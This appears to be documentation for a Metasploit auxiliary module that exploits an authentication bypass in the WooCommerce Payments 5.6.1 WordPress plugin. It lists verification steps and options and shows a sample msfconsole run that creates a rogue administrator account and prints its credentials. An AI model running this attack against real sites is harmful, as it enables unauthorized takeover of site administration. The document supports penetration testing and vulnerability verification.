## Vulnerable Application

WooCommerce-Payments plugin for Wordpress contains an authentication bypass by specifing a valid user ID number
within the `X-WCPAY-PLATFORM-CHECKOUT-USER` header.  With this authentication bypass, a user can then use the API
to create a new user with administartive privileges IF the user ID selected was also an administrator.

### Install

Download, install, and Activate [woocomerce-payments](https://downloads.wordpress.org/plugin/woocommerce-payments.5.6.1.zip)

No configuration is required, and WooCommerce itself is not required.

## Verification Steps

1. Install the plugin
1. Start msfconsole
1. Do: `use auxiliary/scanner/http/wp_woocommerce_payments_add_user`
1. Do: `set username [username]`
1. Do: `set rhosts [ip]`
1. Do: `run`
1. You should get a new administrator created and the credentials.

## Options

### USERNAME

The username to create. Default is `msfadmin`.

### PASSWORD

The password for the user. Default is to create a random one.

### EMAIL

The email address for the user. Default is to create a random one.

### ADMINID

The user ID number for an administrator. Defaults to `1`

## Scenarios

### VWooCommerce Payments 5.6.1 on Wordpress 6.2.2

```
msf6 > use auxiliary/scanner/http/wp_woocommerce_payments_add_user 
msf6 auxiliary(scanner/http/wp_woocommerce_payments_add_user) > set rhosts 1.1.1.1
rhosts => 1.1.1.1
msf6 auxiliary(scanner/http/wp_woocommerce_payments_add_user) > set username h00die
username => h00die
msf6 auxiliary(scanner/http/wp_woocommerce_payments_add_user) > set verbose true
verbose => true
msf6 auxiliary(scanner/http/wp_woocommerce_payments_add_user) > exploit
[*] Running module against 1.1.1.1

[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking /wp-content/plugins/woocommerce-payments/readme.txt
[*] Found version 5.6.1 in the plugin
[+] The target appears to be vulnerable.
[*] Attempting to create administrator -> h00die:lWqD3BOer3AFZ (willie.miller@iwuxphff.qiawqio9t.gov)
[+] User was created successfully
[*] Auxiliary module execution completed
```
